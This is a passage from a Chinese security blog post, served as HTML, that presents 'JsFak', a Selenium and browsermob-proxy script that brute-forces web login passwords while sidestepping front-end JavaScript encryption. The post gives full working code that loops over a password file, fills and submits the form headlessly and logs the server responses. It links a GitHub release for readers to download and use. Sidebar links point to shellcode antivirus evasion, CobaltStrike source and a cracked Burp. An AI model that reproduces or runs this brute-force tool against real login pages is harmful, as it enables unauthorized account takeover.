8080&quot;)#开的什么端口杀什么端口的进程</span><br><span class="line">pid &#x3D; find_netstat.read().split()[4]</span><br><span class="line">kail_pid &#x3D; os.popen(&quot;taskkill &#x2F;F &#x2F;PID &#123;PID&#125;&quot;.format(PID&#x3D;pid))</span><br><span class="line">print(kail_pid.read())</span><br><span class="line">return 1</span><br><span class="line">except IndexError as e:</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">Brower &#x3D; Brower_scan(url,&#39;admin&#39;,&#39;password.txt&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>拿去实战爆破效果一浏览:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/619490803.png"></p>
+<blockquote>
+<p>坑点2<br>实际爆破效果不是这样的<br>密码输入依次为 123456 123456456789 123456455678955664 ……………………一直增大 ,好像缓存没有清楚一样,但是我实际确实clear了</p>
+</blockquote>
+<p>这个问题把我搞了很久,百思不得其解<br>最后,在部门大神的指点下,成功找到原因,并解决问题,果然听君一席话,胜读10年书,不愧是大佬!!</p>
+<blockquote>
+<p>因为起的浏览器默认是记住上次密码的,当我输入一个admin账号的时候,在输入密码,然后浏览器记住了我的账号了,虽然错误,然后继续输入admin,然后浏览器会自动补全123456,然后我再输入了一个456789 结果就成了123456456789了….. 就这个理</p>
+</blockquote>
+<p>更改只需要把顺序调换一下就行了:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(</span><br><span class="line">username)</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()</span><br><span class="line">self.chrome.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)</span><br><span class="line">self.chrome.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).click()</span><br></pre></td></tr></table></figure>
+
+<p>只需要在它补全之前,再次clear就行</p>
+<blockquote>
+<p>坑点3<br>如果登录标签使用click属性,因为元素被包裹的问题,click多了会报错!,解决办法是使用send_keys()</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.chrome.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).send_keys(Keys.RETURN)</span><br></pre></td></tr></table></figure>
+
+<p>好了这里基本上解决了所以的坑点,但是实际的坑点很多,我只是把主要的几点放出来讲了一下,最终代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">from selenium.webdriver.common.desired_capabilities import DesiredCapabilities</span><br><span class="line">from browsermobproxy import Server</span><br><span class="line">from selenium.webdriver.chrome.options import Options</span><br><span class="line">class Brower_scan():</span><br><span class="line">def __init__(self,url,username,password_dir):</span><br><span class="line">self.url &#x3D; url</span><br><span class="line">self.response_result &#x3D; []</span><br><span class="line">self.result&#x3D;&#123;&#125;</span><br><span class="line">self.init_browsermobproxy()</span><br><span class="line">self.init_chrome()</span><br><span class="line">self.init_dict_list(username,password_dir)</span><br><span class="line">self.result_handing()</span><br><span class="line">self.end_env()</span><br><span class="line">def init_dict_list(self,username,password_dir):</span><br><span class="line">with open(password_dir,&quot;r&quot;) as f:</span><br><span class="line">self.password_list &#x3D; f.readlines()</span><br><span class="line">for password in self.password_list:</span><br><span class="line">self.fill_out_a_form(username,password.replace(&#39;\n&#39;,&#39;&#39;))</span><br><span class="line">self.wget_response()</span><br><span class="line">def init_browsermobproxy(self):</span><br><span class="line">self.server &#x3D; Server(&quot;browsermob-proxy-2.1.4\\bin\\browsermob-proxy.bat&quot;)#browermobproxy文件的位置</span><br><span class="line">self.server.start()</span><br><span class="line">self.proxy &#x3D; self.server.create_proxy()</span><br><span class="line">self.chrome_options &#x3D; Options()</span><br><span class="line">self.chrome_options.add_argument(&quot;–incognito&quot;)</span><br><span class="line">self.chrome_options.add_argument(&#39;--proxy-server&#x3D;&#123;0&#125;&#39;.format(self.proxy.proxy))</span><br><span class="line">self.chrome_options.add_argument(&#39;--headless&#39;)#这里加了一个参数,不启动chrome浏览器,省去了启动的时间,更快了</span><br><span class="line">def init_chrome(self):</span><br><span class="line">try:</span><br><span class="line">self.chrome &#x3D; webdriver.Chrome(chrome_options&#x3D;self.chrome_options)</span><br><span class="line">self.proxy.new_har(&quot;test&quot;, options&#x3D;&#123;&#39;captureContent&#39;: True, &#39;captureHeaders&#39;: True&#125;)</span><br><span class="line">self.chrome.get(self.url)</span><br><span class="line">except Exception as e:</span><br><span class="line">print(&quot;Chrome浏览器启动失败！\n&quot;)</span><br><span class="line">return 0</span><br><span class="line">def fill_out_a_form(self,username,password):</span><br><span class="line">print(password)</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()#清空username输入框的标签</span><br><span class="line"></span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input ivu-input-large ivu-input-with-prefix&#39;]&quot;).send_keys(</span><br><span class="line">username)#输入用户名</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input ivu-input-large ivu-input-with-prefix ivu-input-with-suffix&#39;]&quot;).clear()#清空password输入框的标签</span><br><span class="line">self.chrome.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)#输入用户名</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(Keys.RETURN)#点击登录</span><br><span class="line"></span><br><span class="line">def wget_response(self):</span><br><span class="line">result &#x3D; self.proxy.har</span><br><span class="line">for entry in result[&#39;log&#39;][&#39;entries&#39;]:</span><br><span class="line">_url &#x3D; entry[&#39;request&#39;][&#39;url&#39;]</span><br><span class="line">if &quot;password&quot; in _url and &quot;username&quot; in _url:</span><br><span class="line">_response &#x3D; entry[&#39;response&#39;]</span><br><span class="line">_content &#x3D; _response[&#39;content&#39;]</span><br><span class="line"># 获取接口返回内容</span><br><span class="line">self.response_result.append(_response[&#39;content&#39;][&#39;text&#39;])</span><br><span class="line">self.result &#x3D; dict(zip(self.password_list, self.response_result))</span><br><span class="line">def result_handing(self):</span><br><span class="line">for key,value in self.result.items():</span><br><span class="line">print(&quot;密码：&#123;key&#125; :结果：&#123;result&#125;&quot;.format(key&#x3D;key,result&#x3D;value))</span><br><span class="line">def end_env(self):</span><br><span class="line">try:</span><br><span class="line">self.server.stop()</span><br><span class="line">self.chrome.quit()</span><br><span class="line">find_netstat &#x3D; os.popen(&quot;netstat -ano | findstr 8080&quot;)#开的什么端口杀什么端口的进程</span><br><span class="line">pid &#x3D; find_netstat.read().split()[4]</span><br><span class="line">kail_pid &#x3D; os.popen(&quot;taskkill &#x2F;F &#x2F;PID &#123;PID&#125;&quot;.format(PID&#x3D;pid))</span><br><span class="line">print(kail_pid.read())</span><br><span class="line">return 1</span><br><span class="line">except IndexError as e:</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">Brower &#x3D; Brower_scan(url,&#39;admin&#39;,&#39;password.txt&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>这里仅仅把这种方式利用在密码爆破上面,但是实际的利用场景远不止这些,我觉得可以利用任何js加密,jq加密的,前端加密的场景,都可以用到,根本不需要去分析它的js前端加密代码,只需要把爆破行为模拟正常的用户行为就欧克了,不得不说,这种智能的方式真的太方便了!太香了!!!!!!!!</p>
+<p>github已经上传了一个我已经写好的爆破登录界面账号和密码的,大家可以去下载自行享用!</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Gamma-laboratory&#x2F;JsFak</span><br><span class="line">现在只支持通过class来查找输入框和登录按钮，如果需要通过id或其他标识，可以修改源码</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Harvey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2020/12/13/JaFak%EF%BC%9A%E4%B8%80%E6%AC%BE%E6%97%A0%E8%A7%86js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/">http://example.com/2020/12/13/JaFak%EF%BC%9A%E4%B8%80%E6%AC%BE%E6%97%A0%E8%A7%86js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Mssn Harvey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%B7%A5%E5%85%B7%E6%8E%A8%E9%80%81/">工具推送</a><a class="post-meta__tags" href="/tags/JaFak/">JaFak</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(22).jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/IMG_20210320_145848.png" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/IMG_20210320_145848.png" alt="WeChat"/></a><div class="post-qr-code-desc">WeChat</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1616223647_edit_497335509645465.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1616223647_edit_497335509645465.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/12/21/%E9%98%BF%E9%87%8C%E4%BA%91%E4%B8%BB%E6%9C%BAaccesskey%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(23).jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">阿里云主机accesskey利用工具</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/11/%E8%AE%BE%E7%BD%AEiptables%E8%A7%84%E5%88%99%E6%9D%A5%E4%BF%9D%E6%8A%A4CS%E6%9C%8D%E5%8A%A1%E5%99%A8/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(29).jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">设置iptables规则来保护CS服务器</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/02/10/burp-2021-2破解版下载/" title="burp-2021-2破解版下载"><img class="cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/142600993.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-10</div><div class="title">burp-2021-2破解版下载</div></div></a></div><div><a href="/2021/02/01/CyberSecurityRSS/" title="CyberSecurityRSS"><img class="cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(71).jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-01</div><div class="title">CyberSecurityRSS</div></div></a></div><div><a href="/2021/01/29/shellcode免杀框架内附SysWhispers2_x86直接系统调用/" title="shellcode免杀框架内附SysWhispers2_x86直接系统调用"><img class="cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(19).jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-29</div><div class="title">shellcode免杀框架内附SysWhispers2_x86直接系统调用</div></div></a></div><div><a href="/2021/01/29/为被动扫描器量身打造一款爬虫 - LSpider/" title="为被动扫描器量身打造一款爬虫 - LSpider"><img class="cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/milesmorales-swing-ps5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-29</div><div class="title">为被动扫描器量身打造一款爬虫 - LSpider</div></div></a></div><div><a href="/2021/01/21/真香系列-JSFinder实用改造/" title="真香系列-JSFinder实用改造"><img class="cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(73).jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-21</div><div class="title">真香系列-JSFinder实用改造</div></div></a></div><div><a href="/2020/11/12/CobaltStrike源码分享/" title="CobaltStrike源码分享"><img class="cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(65).jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-12</div><div class="title">CobaltStrike源码分享</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Harvey</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MssnHarvey/mssnharvey.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=3305601910" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="https://t.me/MssnHarvey" target="_blank" title="Telegram"><i class="fab fa-telegram"></i></a><a class="social-icon" href="https://github.com/MssnHarvey" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3305601910@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">Welcome to Harvey'Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%9B%A0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前因：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%AE%E7%82%B9%E5%8A%9D%E9%80%80"><span class="toc-number">2.</span> <span class="toc-text">差点劝退</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E9%A9%AC%E8%A1%8C%E7%A9%BA"><span class="toc-number">3.</span> <span class="toc-text">天马行空</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%A5%87%E5%B9%BB%E4%B9%8B%E6%97%85"><span class="toc-number">4.</span> <span class="toc-text">开始奇幻之旅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%B1-%E4%B9%8B-%E5%88%9D-%E6%AD%A5-%E4%BD%93-%E9%AA%8C"><span class="toc-number">5.</span> <span class="toc-text">爱 之 初 步 体 验</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/09/29/TCTF%20Final%20WP/" title="TCTF Final WP"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3368874837.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TCTF Final WP"/></a><div class="content"><a class="title" href="/2021/09/29/TCTF%20Final%20WP/" title="TCTF Final WP">TCTF Final WP</a><time datetime="2021-09-29T07:02:00.000Z" title="发表于 2021-09-29 15:02:00">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="记一次对某大学的逻辑漏洞"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(2).png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次对某大学的逻辑漏洞"/></a><div class="content"><a class="title" href="/2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="记一次对某大学的逻辑漏洞">记一次对某大学的逻辑漏洞</a><time datetime="2021-03-20T13:11:00.000Z" title="发表于 2021-03-20 21:11:00">2021-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1689581160.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-Web分类练习"/></a><div class="content"><a class="title" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习">BUUCTF-Web分类练习</a><time datetime="2021-03-16T06:33:20.000Z" title="发表于 2021-03-16 14:33:20">2021-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/dc3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-3靶机渗透测试报告"/></a><div class="content"><a class="title" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告">DC-3靶机渗透测试报告</a><time datetime="2021-03-15T06:11:00.000Z" title="发表于 2021-03-15 14:11:00">2021-03-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/14/2021VNCTF/" title="VNCTF 2021"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/653112701.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VNCTF 2021"/></a><div class="content"><a class="title" href="/2021/03/14/2021VNCTF/" title="VNCTF 2021">VNCTF 2021</a><time datetime="2021-03-14T07:13:20.000Z" title="发表于 2021-03-14 15:13:20">2021-03-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Harvey</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><img src="https://web-resource.mucang.cn/maiche.web/mucang.official/official/resources/images/new-version/beian.png" width="20" height="20" /> </img> 闽ICP备20002768号</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(()=>{
+  const $countDom = document.getElementById('twikoo-count')
+  const init = () => {
+    let initData = {
+      el: '#twikoo-wrap',
+      envId: '',
+      region: ''
+    }
+
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    twikoo.init(initData)
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: '',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      $countDom.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const loadTwikoo = (bool = false) => {
+    if (typeof twikoo === 'object') {
+      init()
+      bool && $countDom && setTimeout(getCount,0)
+    } else {
+      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
+        init()
+        bool && $countDom && setTimeout(getCount,0)
+      })
+    }
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo(true)
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="000PeZCQ1i4XVs" data-server="tencent" data-type="artist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
